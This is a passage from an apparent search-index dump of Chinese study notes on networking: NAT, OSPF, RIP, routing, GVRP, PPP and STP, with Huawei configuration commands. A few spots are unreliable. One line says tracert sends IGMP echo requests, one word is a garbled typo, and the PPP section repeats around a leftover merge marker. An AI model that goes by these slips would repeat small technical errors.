相关命令：ping -I 或 tracert tracert会一次发送3个igmp echo request报文 Protocol 协议：用来标识上层使用的协议 熟悉的协议号 协议号 1.ICMP 因特网控制报文协议 2.IGMP 因特网组报文协议 6.TCP 传输控制协议 17.UDP 用户数据报协议 41.IPV6 因特网v6 47.GRE 通用路由封装协议 89.OSPF 开放式最短路径优先 103.PIM 协议无关报文 112.VRRP 虚拟路由冗余协议 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/NAT.html":{"url":"1.网络技术/4.路由/NAT.html","title":"NAT","keywords":"","body":" 公网地址的由来：个人/企业——>ISP运营商——>CNNIC中国互联网络信息中心——>APNIC（Asia Pacific Network Information Centre）亚太地址网络信息中心——>IANA互联网数字分配机构 （早在2012年IP地址就已经分配完了） 没有NAT技术，私网地址数据可以出去，但是回不来（无回程路由） 私网地址不可能出现在公网上（太多私网地址重复，设备性能也不足以支持） NAT地址转换缓存表：记录转换地址信息 NAT好处： 有效避免了来自外网的攻击，大大提高了网络安全性 控制内外访问外网，同时也控制外网访问内网，解决了内网和外网通信的问题 家庭路由器和运营商路由器的区别： 记录NAT缓存需要消耗大量的内存，CPU，导致上网速度慢（待机数量） 带宽和包转发 NAT类型：NAT的实现方式有很多种，适用于不同的场景 静态NAT实现了私有地址和公有地址的一对一映射（一对一） 一个公网IP只会分配唯一固定的内网主机 如果希望一台主机专用某个公网地址，或者想要外网访问内网服务器时，可以使用静态NAT 静态NAT不能有效缓解公网地址短缺的问题 静态NAT配置： 命令 备注 nat static enable 开启NAT静态功能 nat static global 公网地址 inside 私网地址 创建静态NAT display nat static 验证静态NAT的配置 动态NAT 动态NAT基于地址池来实现私有地址和公有地址的转换（多对多） 动态NAT定义了地址池，规定一个范围的地址可以供主机转换 动态NAT地址池中的地址用尽后，只能等待被占用的地址被释放，其他主机才能使用它来访问公网 动态NAT也不能有效缓解公网地址短缺的问题 （使用ICMP时地址会变换，是没有端口的，但是有标识，可以根据标识来分辨） NAPT允许多个内部地址映射到同一个公有地址的不同端口（多对一） NAPT（Network Address Port Translation）也称为NAT-PT或PAT 网络地址端口转换 通常适用于大型企业网络（申请多个固定的公网地址） NAPT需要定义地址池，不能直接使用出接口的地址 有效的缓解了公网地址短缺的问题 动态NAT和PAT配置：（命令语句后不跟no-pat即为PAT模式，多对一） 命令 备注 nat address-group 编号 公网地址范围eg:nat address-group 1 12.0.0.50 12.0.0.100 配置NAT地址池 nat outbound acl 编号address-group 编号 [no-pat]eg: nat outbound 2000 address-group 1 no pat 关联一个ACL和一个NAT地址池（所以要先配置ACL的规则，允许哪些主机或网段可以上网）ACL用来匹配能够转换的源地址 no-pat 只转换地址而不转换端口 nat outbound acl 编号 address-group 编号 配置NAPT display nat address-group 查看NAT地址池配置信息 display nat outbound 查看动态NAT配置信息 display nat session all 查看所有NAT会话内容 Easy IP：以出接口公网IP地址作为NAT的地址（SNAT）源端口转换 直接使用出接口的地址做转换 Easy IP适用于小规模居于网中的主机访问Internet的场景 如：家庭、小型网吧、小型办公室中，这些地方内部主机不多，出接口可以通过拨号方式获取一个临时公网IP地址 有效的缓解了公网地址紧缺和不固定的公网地址转换问题 Easy IP 与NAPT的区别 Easy IP直接把内部地址映射到网关出口地址上的不同端口，直接使用公网端口进行转发 不需要像NAPT那样创建公网地址池，也不需要知道公网地址池是多少 Easy IP配置： 命令 备注 nat outbound acl 编号 配置Easy IP 关联出站接口和ACL NAT服务器=端口映射=目的端口转换（DNAT转换） 能够实现外网地址访问内网地址的方法：NAT、VPN NAT具有“屏蔽”内部主机的作用，但有时内网需要向外网提供服务 当外网用户访问内网服务器时，出口设备通过事先配置好的“公网IP地址+端口号”与“私网IP地址+端口号”间的映射关系，将服务器的“公网IP地址和端口号”根据映射关系替换成对应的“私网IP地址+端口号” NAT服务器的公网IP地址和端口中，端口可以更改，提供安全性 NAT服务器配置： 命令 备注 nat server protocol tcp/udpglobal 公网地址 端口 inside 私网地址 端口 配置NAT服务器 nat server protocol tcp global current-interface 端口 inside 私网地址 端口 如果提供的服务地址=出接口地址，需要打current-interface命令，不能打公网地址 display nat server 查看NAT服务器 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/OSPF.html":{"url":"1.网络技术/4.路由/OSPF.html","title":"OSPF","keywords":"","body":" OSPF概述：Open shortest path first 开放式最短路径优先 大中型网络使用最广泛的IGP协议 链路状态路由协议 无类别路由 使用组播（224.0.0.5和224.0.0.6） 收敛较快 以开销（Cost以接口带宽作为计算）作为度量值 采用SPF算法可以有效的避免环路 触发式更新（以较低频率 （每30分钟）定期发送更新，被称为链路状态泛洪） 设置区域概率使得OSPF能够支持更大规模的网络（划分骨干区域和非骨干区域和特殊区域） 通过LSA（链路状态信息）的形式发布路由 不支持自动汇总，支持手动汇总 （在ABR/ASBR上配置） OSPF区域概述： 术语 备注 区域（Area） 为了适应大型网络，OSPF在AS内划分多个区域区域是以接口为单位来划分每个OSPF路由器只维护所在区域的完整链路状态信息 区域ID（Area ID） 可以表示成一个十进制的数字，如：1也可以表示成一个IP，如：0.0.0.1 区域优点 尽量减少LSDB大小拓扑变化仅影响本区域内部 OSPF区域类型： 类型 备注 骨干区域 area 0骨干区域，也称为传输区域（负责在不同非骨干区域之间分发路由信息） 非骨干区域 area 0除外非骨干区域，称为末端区域 划分多区域的作用： 为了减轻运行OSPF路由器的压力 防环机制：划分了骨干区域和非骨干区域，所有非骨干区域通讯必须经过骨干区域中转 骨干区域传来的LSA不会再传回骨干区域 非骨干区域之间通信需要骨干区域转发（为了防止环路） OSPF路由器角色： 角色 备注 IR Internal Router 内部路由器所有接口都属于同一个区域 BR Backbone Router 骨干路由器至少有一个接口属于骨干区域 ABR Area Border Router 区域边界路由连接多个不同的区域，至少有一个接口属于骨干区域 ASBR Autonomous System Border Router自治系统边界路由器 将其他路由协议学习到的路由以引入的方式到OSPF进程中 PS 一台路由器可以同时属于多种类型 OSPF核心工作流程： 发现并建立邻居 传播LSA（区别基于距离矢量算法的路由表更新）LSA的内容 ： 1. Link State Advertisement 链路状态宣告（路况信息） 链路：路由器接口 状态：描述接口信息（地址、掩码、开销、网络类型、邻居关系等） 将LSA泛洪到区域中的所有OSPF路由器，而不仅是直连的路由 收集LSA创建LSDB（链路状态数据库、地图） 使用SPF算法计算到达每个目标网络的最短路径，存放于路由表 OSPF三张表： 类型 含义 邻居表dis ospf peer 记录所有邻居关系 链路状态数据库dis ospf lsdb 记录所有链路状态信息 路由表dis ip routing-table 记录最佳路由 Router ID： 运行OSPF协议前，必须选取的一个RID 用来唯一标识一台OSPF路由器（不能重复） RID可以手动配置，也可以自动生成 规则 备注 RID选取规则顺序 1.推荐手动配置（例：ospf 1 router-id 1.1.1.1这个RID可以和你的接口地址完全没有关系也可以配置成一样的地址)2.活动回环接口中选取IP地址最大的3.活动物理接口中选取IP地址最大的 注： 选取Router-ID时，先看回环口再看物理口 任何选举值都未配置是运行不了OSPF的（router id为0.0.0.0） 比较到物理接口中活动物理接口选取不出来，会选择非活动接口 RID选举具有非抢占性，除非重启OSPF进程 OSPF数据包的结构和类型：封装基于IP协议，协议号为89 OSPF数据包分为OSPF报头和OSPF数据部分： OSPF报头字段是固定的，OSPF数据包的内容由报头的类型决定 OSPF数据包的类型（5种类型）： OSPF数据包 作用 Hello 建立并维护邻居关系 Database Description （DD）比较数据库，只在邻居建立时发送 LSDB的摘要信息（仅包含LSA头部） Link State Request（LSR） 请求LSA Link State Update （LSU） 发送LSA （完整的LSA信息） Link State Acknowledge （LSAck） 对LSU的确认 （OSPF的确认机制） OSPF状态机制（7种状态）：下图有8种状态，Attempt状态只在帧中继中有用，暂不考虑 阶段 状态 备注 第一阶段 失效状态（Down） 没有收到Hello包 第一阶段 初始状态（Init） 收到了Hello包，但是邻居列表里没我 第一阶段 双向通信状态（Two-Way） 收到了Hello包，且看到自己，形成邻居关系 交换初始状态（Exstart） 决定信息交换时的路由器主从关系 交互状态（Exchange） 向邻居发送DD数据包 加载状态（Loading） LSR和LSU交互阶段（互发LSA信息） 完全邻接状态（Full） LSDB同步完成，形成邻接关系 注：只有Two-Way和Full是稳定状态 OSPF工作流程（数据包和状态切换过程）： OSPF第一阶段：使用Hello包建立双向通信的过程，成为邻居关系。 OSPF第二阶段：通过交换LSA达到LSDB同步，建立邻接关系 Exstart：Seq序列号x，I=1表示是第一个发送的DD包，M=1表示后面还有DD包，MS=1表示我是主（初始都是主） 通过比较Router ID值大的一方为主，向主发送的DD报文中序列号会变成主的序列号，同时这才是真正的DD报文 Seq序列号y+n表示经过比较RID后较大的序列号建立了邻居，MS=1表示我是主，此处由R2先向你发送LSDB链路状态数据库摘要，R1收到后向R2反馈R1自己的LSDB摘要，使R2先达到Full状态；R2至此建立了完整的LSA，向R1发送LSU链路状态更新，R1收到后发送LSAck确认信息，R1至此也达到Full状态。 注： 确认主从的作用是为了LSDB同步可靠 同一区域内的路由器中LSDB链路状态数据库必须是一致的，但是每个路由器的路由表和邻居表是不一样的 OSPF邻居建立条件：必须三层直连 建立邻居需要检验的字段： RID唯一（不能重复） 发送Hello包和邻居失效时间一致 区域ID一致 认证一致 链路MTU大小一致（华为默认不开启，思科默认开启） 子网掩码一致、网络地址一致 （以太网组网环境） 末梢区域设置一致 （Option字段） OSPF网络类型：推出时间较早，为了支持不同的链路，而设计了网络类型 OSPF网络类型：基于接口 广播网络类型（BMA） 点到点网络类型(P2P) 非广播多路访问类型(NBMA) 点到多点网络类型(P2MP) 判断网络类型基于接口 （在BMA网络中，每一个网段选取一个DR,BDR） 类型 备注 广播类型 BMA 通过以太网接口连接设备，支持广播和组播 点到点P2P 通过串行接口连接设备，支持广播和组播 非广播多路访问NBMA 早期使用帧中继，ATM组网的设备，不支持广播和组播 点到多点 P2MP 多个点到点的集合，没有一种链路层协议会被缺省的认为是P2MP类型。点到多点必须是由其他的网络类型强制更改的。 DR和BDR： 只要是多路访问BMA和NBMA网络中，为了减少邻接关系的数量，从而减少数据包的交换次数，最终节省带宽，降低路由器的处理压力，选举DR和BDR 术语 备注 DR Designed Router 指定路由器 ，类似于班长、总经理 BDR Backup Designed Router 指定备份路由器，DR的备份，类似于副班长、副总经理 DRothers 路由器，类似于普通学生 关系 DR、BDR、DRothers之间都保持邻接关系 （Full）DRthers之间都保持邻居关系（Two-Way） 地址 224.0.0.6向DR和BDR发送 （LSA包）224.0.0.5向所有OSPF路由器发送 （Hello包） 选举规则 首先比较Hello报文中携带的优先级优先级范围0~255，默认为1优先级最高的被选举为DR，优先级次高的被选举为BDR优先级为0不参与选举优先级一致，比较RID，越大越优先选举具有非抢占性（选举完成后出现更好的OSPF路由器不会强占角色） 实验演示：当前AR1是DR，AR2是BDR R1（DR）和R3、R4,R2（BDR）和R3、R4是Full的关系，R3（DRothers）和R4（DRothers）是Two-way的关系 重新选举DR和BDR使用的命令 LSDB同步过程：DR和BDR会接收224.0.0.6的LSU监听信号和LSack确认信号，（DRthers的路由器链路状态一但发生改变会直接通过224.0.0.6发送组播LSU给DR和BDR） DR收到LSU更新，会使用224.0.0.5组播泛洪到所有路由器 OSPF度量值：Cost 开销 在每一个运行OSPF的接口上，都维护着一个接口Cost 公式：Cost=10^8次方/带宽（bps）=100Mbps/BW=接口参考值/接口带宽（cost最小为1，没有小数） 到一个目标网络的度量值 从源到目标的所有出站接口的 Cost值累加（数据方向） 从目标到源沿途所有的入站接口的Cost值累加（路由方向） 注：华为的回环口的开销默认是0，思科的回环口开销默认是1 OSPF配置： 命令 备注 ospf 1 router-id 1.1.1.1 开启OSPF，进程号默认为1，手动配置RID area 0/0.0.0.0 配置区域 network 192.168.0.0 0.0.0.255 宣告网络，即指定运行OSPF的接口；使用反掩码来匹配（255.255.255.255减去掩码得到的值） authentication-mode md5/simple 设置认证，明文或密文 default -route-advertise 发布默认路由 display ospf peer （brief） 显示OSPF邻居信息 ospf timer Hello 10 修改Hello包的发送时间 ospf timer dead 40 修改Hello包的超时时间 display ospf interface g0/0/0 显示OSPF接口信息 ospf dr-priority 10 修改OSPF接口优先级，范围0~2550为不参与选举，255为必参与选举 ospf cost 10 修改开销，范围1~65535，缺省值为1 bandwidth-reference 100 修改开销计算的参考值，默认为100Mbps（修改公式中的分子）最好在整个OSPF网络中统一修改 reset ospf process number 重启OSPF进程，默认为1 ospf 1 enable area 0 在接口开启OSPF功能 default-route-advertise OSPF缺省路由发布命令 int g0/0/0 ospf authentication-mode md5 1 cipher password 配置接口认证如果同时配置，接口认证优先生效 ospf 1 area 0 authentication-mode md5 1 cipher password 配置区域认证 OSPF缺省路由发布：default-route-advertise 在出口的路由器上发布一条缺省路由，让内部的其他路由器动态学习 OSPF认证：基于接口区域 OSPF认证命令： 命令 备注 int g0/0/0 ospf authentication-mode md5 1 cipher password 配置接口认证 ospf 1 area 0 authentication-mode md5 1 cipher password 配置区域认证 PS：如果同时配置，接口认证优先生效 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/RIP.html":{"url":"1.网络技术/4.路由/RIP.html","title":"RIP","keywords":"","body":" RIP：routing information protocol 路由信息协议 距离矢量路由协议，属于IGP协议 适合中小企业网络，有RIPv1和RIPv2、RIPv3版本 基于UDP，端口号520 周期性（25.5~30.0/次）更新 支持水平分割、毒性反转和触发更新等防环机制 RIP把跳数作为度量值来衡量到达目的网络的距离 缺省情况下，直连网络的路由跳数为0，当路由器发送路由更新时，会将度量值加1 RIP规定超过15跳为网络不可达 RIP报文类型：请求request 和 回应response 请求报文：建立邻居后请求对方的路由信息 回应报文：回应对方的请求 每周期30/s次 RIPv1和RIPv2的区别： 版本 区别 RIPv1 有类别路由协议不支持VLSM,CIDR以广播的形式发送报文不支持认证 RIPv2 无类别路由协议支持VLSM，CIDR支持以广播或者组播（224.0.0.9）方式发送报文支持明文认证和MD5认证 RIPv1与RIPv2报文格式： 命令：值为1表示请求，值为2表示回应 版本：表明使用的版本 协议簇：TCP/IP协议该字段为2 RIP解决环路的方式：触发更新和水平分割、毒性反转 类型 含义 触发更新： 网络存在变化立即通知邻居 水平分割： 从邻居收到的路由信息不会在转发回去 毒性反转： 从邻居收到的路由信息会转发回去，但跳数置为16 水平分割和毒性反转时不能同时使用 默认使用水平分割，如果水平分割和毒性反转都存在则毒性反转生效 同时存在多个网段，但只想一个接口生效： 如果接口配置了input或output，静默生效 命令 备注 Rip 1 开启RIP进程，默认进程为1 Version 2 开启RIPv2版本 Network 10.0.0.0 宣告网络，将该IP地址的接口开启RIP功能 Rip metricin 5 设置接口接收路由增加度量值 Rip metricout 5 设置接口发送路由修改度量值 Rip split-horizon 开启水平分割，默认开启 Rip poison-reverse 开启毒性反转，默认关闭 Undo rip input 禁止接口接收RIP数据包 Undo rip output 禁止接口发送RIP数据包 slient-interface g0/0/0 配置被动接口，只收不发 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/动态路由概述.html":{"url":"1.网络技术/4.路由/动态路由概述.html","title":"动态路由概述","keywords":"","body":"静态路由与动态路由的比较： 协议 备注 静态 不能及时根据网络变化而自适应 动态 及时根据网络变化而自适应 路由协议概述： 路由器之间交互的一种语言 共享路由信息 维护路由器、提供最佳转发路径 路由协议总览： 类型 距离矢量协议 结合版 链路状态协议 路径矢量协议 有类 RIPv1 IGRP EGP 无类 RIPv2 EIGRP OSPFv2 ISIS BGPv4 IPv6 RIPng EIGRP for IPv6 OSPFv3 ISIS for IPv6 BGPv4 for BGPv6 路由协议分类：根据作用范围 类型 备注 IGP 内部网关协议（Interior gateway protocol） 用于一个AS内部交互路由信息常用协议：RIP、OSPF、ISIS、EIGRP EGP 外部网关路由协议（Exterior gateway protocol） 用于不同AS之间交互路由信息常用协议:BGP AS（autonomous system）：处于同一管理机构下的网络（如：企业、电信、移动、联通） IGP和EGP的区别： 类型 区别 IGP 路由器相互信任 （同一管理机构）路由数量较少注重发现路由，不需要什么策略 EGP 路由器并非相互信任 （不同管理机构）路由数量庞大注重于引入路由，策略丰富 路由协议分类：根据协议算法 类型 备注 DV 距离矢量（distance-vector） 基于距离矢量算法，路由器并不了解网络拓扑信息交互路由信息都会修改原始参数 （类似路旁，道听途说）如：RIP、EIGRP LS 链路状态 （link-state） 基于SPF算法（shortest path first 最短路径优先），路由器了解完整的网络交互路由信息直接传递不会修改原始参数（类似地图，完整）如：OSPF、ISIS 根据链路带宽来选择路由 路由协议分类：根据发送的更新是否携带掩码 类型 备注 Classful有类 不携带掩码如：RIPv1、IGRP、EGP clasless无类 携带掩码如：RIPv2、EIGRP、OSPF、BGP 不携带掩码：默认的路由掩码都是默认的，影响路由选路 路由协议分类：根据业务应用 类型 备注 Unicast routing protocol单播路由协议 如：RIP、EIGRP、OSPF、BGP、ISIS Multicast routing protocol组播路由协议 如：DVMRP、PIM-SM、PIM-DM 路由协议配置规则： 协议是在接口运行的 （需要宣告接口的IP地址/接口开启协议） 只能学习和发布运行相同协议的路由信息（不同路由协议之间互不干扰） 不同路由协议之间需要交互路由信息，需要进行引入/注入（Import） 注：引入必须要同时运行多个协议的路由器做中间人/代理 路由器收敛： 当所有路由表的信息都有一致的网络可达信息（相同的目的地址） 网络（路由）进入一个稳定状态 网络在达到收敛前无法完全正常工作 选择/衡量动态路由协议的一些性能指标： 指标 备注 正确性 能够正确的找到最优且无环的路由 收敛快 当网络发生变化后，能够快速做出响应 低开销 协议自身的开销（占用内存、CPU、带宽） 安全性 协议具有安全机制 普适度 适合各种拓扑结构和各种规模的网络 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/单播、组播、广播.html":{"url":"1.网络技术/4.路由/单播、组播、广播.html","title":"单播、组播、广播","keywords":"","body":"根据目标地址判断 类型 备注 单播 Unicast 发送给单个设备（明确目标地址） 广播 Broadcast 发送给所属广播域内的所有设备（目标地址不明确） MAC地址全F，IP地址全1 组播 Multicast 发送给一组目标MAC地址为01-00-5e，IP地址为D类 接收规则： 如果是单播帧，会比较目的MAC是否一致 如果是广播帧，会接收处理 （收到了不一定会回复） 组播只会给需要该数据的设备 冲突与广播： 冲突 Collision多个设备如果连接都一个传输信道上，发生的冲撞会导致信号不完整只会发生在早期使用使用集线器组网的共享式网络中 冲突域 Collision domain能够产生冲突的设备的范围 广播 Broadcast发送给所有设备 广播域 Broadcast domain能够收到广播的设备的范围 集线器 HUB不能分割冲突域和广播域 （所有接口都属于一个冲突域和广播域） 交换机 Switch 能够分割冲突域不能分割广播域（每个接口都是单独的冲突域） 路由器 Router能够分割冲突域和广播域（每个接口都是一个广播域） 集线器/信号复制器 HUB ：早期组网使用的设备 交换机 Switch ：重要的组网设备 路由器Router： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.网络技术/4.路由/网关及数据转发过程.html":{"url":"1.网络技术/4.路由/网关及数据转发过程.html","title":"网关及数据转发过程","keywords":"","body":" 网关：Gateway 位于不同网络之间的主机需要通信，必须将数据包交给网关 （默认路由） 网关是一台具备路由功能的设备（路由器、三层交换机、防火墙、服务器） 网关地址与设备的接口地址是处于同个网络 主机经过与计算得出目的地址是否在同个网段同一个网段直接封装目的的MAC转发不同网段封装网关的MAC，网关帮忙转发 数据包转发的过程中IP地址和MAC地址：在同一个网段内的源MAC地址是不会变化，非同一个网段的源MAC地址会变化、IP地址一般不会变化，除使用NAT技术 数据转发过程： 主机A访问HTTP服务器 目的端口号：80 封装源IP目的IP地址，并进行与计算 不在同一网段，交给网关 检查缓存表是否有网关的MAC，没有进行ARP请求 最终以光信号、电信号发送出去 网关收到，进行FCS帧校验检测，通过检测目的MAC地址是否是我，通过交给网络层 发现目的IP地址不是我，查找路由表、封装新的二层帧头和帧尾，并进行转发 路由器以服务器A的MAC地址作为目的MAC地址继续转发 服务器A收到，进行FCS检测，通过检测目的MAC是我的MAC，继续交给上层处理 检测目的IP地址是我，检测协议号为TCP，交给TCP TCP检测目的端口交给HTTP 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/路由基础.html":{"url":"1.网络技术/4.路由/路由基础.html","title":"路由基础","keywords":"","body":" 常用名词： 术语 备注 路由routing 从源地址到目的地址不同网络间的转发过程 路由表routing table 路由信息的集合 路由的依据 路由器 router 具有路由功能的设备 默认网关default gateway 通过是路由设备的接口IP地址 路由过程图解： 路由器收到数据包检测路由表中是否存在能够去往目的IP地址、转发过程中是逐跳转发“并不会引导其他路由器转发”、数据通信是”双向性“ 路由表只是转发的依据，真正转发的是根据接口 “知道从哪里发送” 下一跳是路由器需要将该数据包交给谁来转发 路由协议分为动态协议和静态协议 静态的配置简单，不占用资源 动态协议配置相对复杂，可以及时同步网络变化 IP路由表：存放最优的路由信息/条目 路由表包含了可以去往的目的网络 ，路由器收到目的网络不存在的会直接丢弃 路由表字段 备注 Destination目标地址 用来标识存在的能够去往的目的地址或目的网络 Mask掩码 用来选择最佳路由的重要依据（最长匹配原则） NextHop下一跳 指明该数据包所经过的下一个路由器的接口地址 Interface出接口 指明该数据包将从哪个接口转发 Protocol 协议 路由的来源（学习方式） Preference优先级 用来比较不同协议学习去往相同地址不同路径的优先程度（越小越优先） cost开销 用来比较相同协议学习去往相同地址不同路径的的代价（越小越优先） 不同协议比较 路由协议/类型 Direct OSPF ISIS Static RIP OSPF ASE BGP 管理距离/优先级 0 10 15 60 100 150 255 相同协议比较 等价路由（ECMP，Equal cost multi-Path）： 对于一个路由来源，当到同一个目标网络存在多条相同度量值的路由时，路由器会将这些路由条目都加入路由表，数据包会在这几个链路（路径）进行负载分担。 （负载均衡的选择：逐包，逐流 可以根据目标IP或源IP，目标MAC或源MAC选择。最终会经过“哈希”计算实现） 最长掩码匹配原则：最终数据包实现最佳路由的算法 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.网络技术/4.路由/静态路由.html":{"url":"1.网络技术/4.路由/静态路由.html","title":"静态路由","keywords":"","body":" 技术背景：如果只有直连路由，那么非直连网络就无法到达 静态路由概述： 配置简单、开销小 通过手动配置进行添加和维护 无法根据拓扑的变化而自适应 适合于组网规模较小的场景，在大型网络环境，则配置及维护成本很高 在大型网络中，往往采用动、静态路由结合的方式部署网络 静态路由配置命令： 命令 备注 Ip route-static 目标网络 子网掩码/前缀 下一跳/出接口 配置静态路由 实现流量负载分担，提高链路利用率 优先级高的为活跃，优先级低的为非活跃 主链路故障，备份链路激活 缺省路由（网关）：一种特殊的路由，能匹配所有目标网络 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/5.交换/GARP-GVRP.html":{"url":"1.网络技术/5.交换/GARP-GVRP.html","title":"GARP GVRP","keywords":"","body":" GARP:Generic Attribute Regisration Protocol 通用属性注册协议 在交换机间分发、传播、注册某种信息（VLAN属性、组播地址等） 主要用于大中型企业网络中，用来提升管理交换机的效率 一种协议规范 GARP消息类型: 类型 备注 Join 加入，端口加入VLAN Leave 注销，端口退出VLAN Leave All 注销所有 GVRP：GARP VLAN Registration Protocol，VLAN注册协议 GVRP基于GARP的工作机制，是GARP的一种应用，传递VLAN信息 VLAN分为常规（静态）和动态VLAN GVRP的结构： 工作于数据链路层 使用组播地址01：80：c2：00：00：21 GVRP的应用： 接收来自其他交换机的VLAN注册信息，并动态的更新本地的VLAN信息同步 将本地的VLAN注册信息向其他交换机传播，以便同一交换网内所有支持GVRP的设备VLAN信息同步 手动配置的VLAN是静态VLAN，通过GVRP创建的VLAN是动态VLAN GVRP传播的VLAN注册信息包括静态创建的VLAN信息和动态学习的VLAN信息 收到VLAN注册信息会将端口进行绑定，分发的端口不会进行绑定 GVRP注册模式：3种 Normal正常模式：允许静态和动态VLAN注册，同时会发送静态VLAN和动态VLAN的声明消息。 Forbidden禁止模式：不会接收动态VLAN注册，同时删除所有学习到的VLAN （只剩VLAN1）。 Fixed固定模式：不会发送和接收动态的注册信息，只会发送静态注册消息。 GVRP配置： 命令 配置 gvrp 全局开启GVRP，默认关闭 int g0/0/1gvrp 接口开启GVRP，接口类型必须是Trunk gvrp registration fixedgvrp registration forbiddengvrp registration normal 配置GVRP注册模式 display gvrp status 查看GVRP状态 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:13 "},"1.网络技术/5.交换/PPP.html":{"url":"1.网络技术/5.交换/PPP.html","title":"PPP","keywords":"","body":" HDLC 可以租用接口地址来节省IP地址，同时可以批量修改端口地址PPP 名称 认证 错误检测 错误恢复 支持同步或异步链路 HDLC × √ × × PPP √ √ √ √ PPP组件 名称 作用 上层 NCP网络层控制协议Network Control Protocol 用于对不同的网络层协议进行连接建立和参数协商 下层 LCP链路控制协议Link Control Protocol 用于建立、拆除和监控PPP数据链路以及认证 PPP认证模式：PAP和CHAP 模式 备注 PAP（发明文密码） Password authentication protocol，密码认证协议 ，以明文方式直接放送密码，二次握手机制，发起方为被认证方缺点：以明文的形式发送密码不安全因为发送方为被任正非所以可以无限次的尝试（暴力破解）只在链路建立的阶段认证，一旦成功建立后将不在认证 CHAP（发暗号） Challenge Handshake Authentication Protocol，挑战/质询握手认证议，以MD5来隐藏密码，三次握手机制，发起方为认证方，有效避免了暴力破解，在链路建立后具有再次认证检测机制，目前使用的广泛 PPP认证配置： 命令 备注 aaa local-user huawei password cipher 123.com local-user huawei service-type ppp 配置PPP，设置用户名、密码和服务类型 ppp authentication-mode PAP 或ppp authentication-mode CHAP 开启PAP或CHAP认证（认证方配的） ppp pap local-user huawei password cipher 123.com 配置PAP认证（被认证方配的） ppp chap user huaweippp chap password cipher 123.com 配置CHAP认证（被认证方配的） 注： 只配置一方的用户名和密码，另一方开启认证的，这种为单向认证。 ======= HDLC 可以租用接口地址来节省IP地址，同时可以批量修改端口地址 PPP 名称 认证 错误检测 错误恢复 支持同步或异步链路 HDLC × √ × × PPP √ √ √ √ PPP组件 名称 作用 上层 NCP网络层控制协议Network Control Protocol 用于对不同的网络层协议进行连接建立和参数协商 下层 LCP链路控制协议Link Control Protocol 用于建立、拆除和监控PPP数据链路以及认证 PPP认证模式：PAP和CHAP 模式 备注 PAP（发明文密码） Password authentication protocol，密码认证协议 ，以明文方式直接放送密码，二次握手机制，发起方为被认证方缺点：以明文的形式发送密码不安全因为发送方为被任正非所以可以无限次的尝试（暴力破解）只在链路建立的阶段认证，一旦成功建立后将不在认证 CHAP（发暗号） Challenge Handshake Authentication Protocol，挑战/质询握手认证议，以MD5来隐藏密码，三次握手机制，发起方为认证方，有效避免了暴力破解，在链路建立后具有再次认证检测机制，目前使用的广泛 PPP认证配置： 命令 备注 aaa local-user huawei password cipher 123.com local-user huawei service-type ppp 配置PPP，设置用户名、密码和服务类型 ppp authentication-mode PAP 或ppp authentication-mode CHAP 开启PAP或CHAP认证（认证方配的） ppp pap local-user huawei password cipher 123.com 配置PAP认证（被认证方配的） ppp chap user huaweippp chap password cipher 123.com 配置CHAP认证（被认证方配的） 注： 只配置一方的用户名和密码，另一方开启认证的，这种为单向认证。 两边都配置用户名和密码，同时开启认证模式，互相发送认证信息，这种为双向认证。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:13 "},"1.网络技术/5.交换/STP.html":{"url":"1.网络技术/5.交换/STP.html","title":"STP","keywords":"","body":"STP生成树协议 STP的背景：为了实现二层设备（Ethernet协议）之间的可靠性，企业网络通常拿多台设备或链路实现链路冗余备份，会引起环路 二层网络设计的需求和问题： 为了提高可靠性，交换机之间会通过多条链路相连，从而避免单点故障。 但也会带来一些致命的环路问题。 环路问题给用户带来的后果：网络体验差、延迟高、丢包 环路引起的问题： 极大占用链路带宽资源和设备资源，造成大量的垃圾流量 网络广播风暴 MAC地址表项不稳定 重复的帧拷贝 STP：Spanning Tree Protocol生成树协议 提供两大功能： 功能 备注 消除环路 通过阻断冗余链路来消除网络中可能存在的环路 链路备份 当正常工作的链路出现问题，激活备份链路，及时恢复网络连通性 STP操作：通过构建一颗无环的树来消除网络中的环路。 BPDU：Bridge Protocol Data Unit - 桥协议数据单元 使用组播地址：01-80-C2-00-00-00 PID：STP的ID（无论是STP、RSTP、MSTP都是STP） PVI：标识使用的是什么模式（STP、RSTP、MSTP）华为默认的模式是RSTP BPDU 类型： 配置BPDU：Configuration 选举根交换机以及确定每个交换机的角色和状态。 在初始过程中，每个桥都主动发送配置BPDU。 在网络拓扑稳定后，只有根桥主动发送配置BPDU，其他交换机在收到上游传来的配置BPDU后，才会发送自己的配置BPDU。 发送周期为Hello Time。 老化时间为Max Age。 拓扑变更通告BPDU：TCN BPDU 下游交换机感知到拓扑变化时向上游发送的拓扑变化通知。 配置BPDU： 拓扑变更通知BPDU： BPDU字段详解： 选举桥角色和端口状态靠该4个字段 参数 描述 Root ldentifier根桥ID 发送此配置BPDU的交换机所认为的根交换机的标识 Root Path Cost根路径开销 从接收此根桥的配置BPDU的交换机到达根交换机的最短路径总开销（我到根桥有多远） Bridge identifier桥ID 标识自己的BID Port Identifier端口ID 发送此配置BPDU的交换机端口的端口标识 